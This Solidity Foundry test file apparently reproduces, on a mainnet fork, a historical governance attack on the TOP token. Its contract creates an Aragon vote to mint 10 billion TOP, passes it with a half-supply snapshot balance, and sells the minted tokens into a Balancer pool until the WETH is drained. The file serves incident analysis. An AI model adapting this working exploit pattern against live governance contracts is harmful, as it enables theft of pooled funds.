// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 944.20 WETH
// Attacker : 0xff8ef7bc455a57e5893232203052ce0232b39fa2
// Attack Contract : 0x25c68c44a96518294f5b47d758f98309c6729a21
// Vulnerable Contract : 0xb935c3d80229d5d92f3761b17cd81dc2610e3a45
// Attack Tx : https://etherscan.io/tx/0x967aa34c69b7775c718545c7f94d92e965eb5fc553c0f27f6f1a9c65c93ac156

// @Info
// Voting Entry Proxy : https://etherscan.io/address/0xb501d26ba74eab601576b62617cf41042bef6865#code
// Voting Implementation : https://etherscan.io/address/0xb935c3d80229d5d92f3761b17cd81dc2610e3a45#code
// TokenManager Entry Proxy : https://etherscan.io/address/0x3ac1856376c25a7aebbad1c2a10db63b5dbb7306#code
// TokenManager Implementation : https://etherscan.io/address/0xde3a93028f2283cc28756b3674bd657eafb992f4#code
// Balancer BPool : https://etherscan.io/address/0x0fa3e014fa2e751f78e53dca766fac2223327329#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2064616112822583505
//
// The historical attack contract held 8,192.000001 TOP against a 16,384 TOP snapshot supply.
// It created an Aragon vote to mint 10 billion TOP to itself, voted the proposal through in the same
// transaction, then sold the newly minted TOP into the Balancer BPool for WETH.

address constant ATTACKER = 0xff8eF7bC455a57e5893232203052Ce0232b39Fa2;
address constant ATTACK_CONTRACT = 0x25c68C44A96518294f5B47D758f98309c6729A21;
address constant TOP = 0x0EBD5eC91680d3B0CEDbb1d5BB61851154D3eDb6;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant BPOOL = 0x0fa3E014fA2E751F78e53Dca766faC2223327329;
address constant TOKEN_MANAGER = 0x3ac1856376C25A7AeBBAd1C2A10db63b5dbB7306;
address constant VOTING = 0xB501d26BA74eaB601576B62617Cf41042bEf6865;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ITokenManager {
    function forward(bytes calldata evmCallScript) external;
    function mint(address receiver, uint256 amount) external;
}

interface IVoting {
    function newVote(
        bytes calldata executionScript,
        string calldata metadata,
        bool castVote,
        bool executesIfDecided
    ) external returns (uint256 voteId);
    function vote(uint256 voteId, bool voteSupports, bool executesIfDecided) external;
    function votesLength() external view returns (uint256);
}

interface IBPool {
    function getBalance(address token) external view returns (uint256);
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 25_279_891;
        vm.createSelectFork("mainnet", forkBlock);
        vm.roll(forkBlock + 1);
        fundingToken = WETH;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(TOP, "TOP");
        vm.label(WETH, "WETH");
        vm.label(BPOOL, "Balancer TOP/WETH BPool");
        vm.label(TOKEN_MANAGER, "TOP TokenManager Proxy");
        vm.label(VOTING, "TOP Voting Proxy");
    }

    function testExploit() public {
        uint256 attackerWethBefore = IERC20Like(WETH).balanceOf(ATTACKER);
        uint256 poolWethBefore = IERC20Like(WETH).balanceOf(BPOOL);

        vm.etch(ATTACK_CONTRACT, type(TopBPoolDrain).runtimeCode);

        vm.prank(ATTACKER);
        TopBPoolDrain(ATTACK_CONTRACT).drain();

        uint256 attackerWethAfter = IERC20Like(WETH).balanceOf(ATTACKER);
        uint256 poolWethAfter = IERC20Like(WETH).balanceOf(BPOOL);
        uint256 attackerProfit = attackerWethAfter - attackerWethBefore;

        emit log_named_decimal_uint("Attacker WETH profit", attackerProfit, 18);
        emit log_named_decimal_uint("BPool WETH before", poolWethBefore, 18);
        emit log_named_decimal_uint("BPool WETH after", poolWethAfter, 18);

        assertGt(attackerProfit, poolWethBefore, "attacker did not receive drained WETH");
        assertLt(poolWethAfter, poolWethBefore / 1_000_000_000, "BPool WETH was not drained to dust");
    }
}

contract TopBPoolDrain {
    function drain() external {
        // step 1: create an Aragon vote whose execution script mints TOP to this historical address.
        uint256 voteId = IVoting(VOTING).votesLength();
        ITokenManager(TOKEN_MANAGER).forward(buildNewMintVoteScript());

        // step 2: use the historical address's pre-attack TOP snapshot balance to pass and execute it.
        IVoting(VOTING).vote(voteId, true, true);

        // step 3: sell the minted TOP into the Balancer pool at the maximum allowed in-ratio each round.
        IERC20Like(TOP).approve(BPOOL, type(uint256).max);
        while (IERC20Like(TOP).balanceOf(address(this)) > 0) {
            uint256 topBalance = IERC20Like(TOP).balanceOf(address(this));
            uint256 amountIn = IBPool(BPOOL).getBalance(TOP) / 2;
            if (amountIn > topBalance) amountIn = topBalance;

            IBPool(BPOOL).swapExactAmountIn(TOP, amountIn, WETH, 0, type(uint256).max);
            require(IERC20Like(TOP).balanceOf(address(this)) < topBalance, "TOP balance did not decrease");
        }

        // step 4: forward the drained WETH plus the contract's pre-existing WETH dust to the tx sender.
        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        IERC20Like(WETH).transfer(ATTACKER, wethBalance);
    }

    function buildNewMintVoteScript() private view returns (bytes memory) {
        uint256 mintAmount = 10_000_000_000 ether;
        bytes memory mintCall = abi.encodeWithSelector(ITokenManager.mint.selector, address(this), mintAmount);
        bytes memory mintScript = buildEvmCallScript(TOKEN_MANAGER, mintCall);

        bytes memory newVoteCall =
            abi.encodeWithSelector(IVoting.newVote.selector, mintScript, "single-contract drain", false, false);
        return buildEvmCallScript(VOTING, newVoteCall);
    }

    function buildEvmCallScript(address target, bytes memory callData) private pure returns (bytes memory) {
        return abi.encodePacked(uint32(1), target, uint32(callData.length), callData);
    }
}
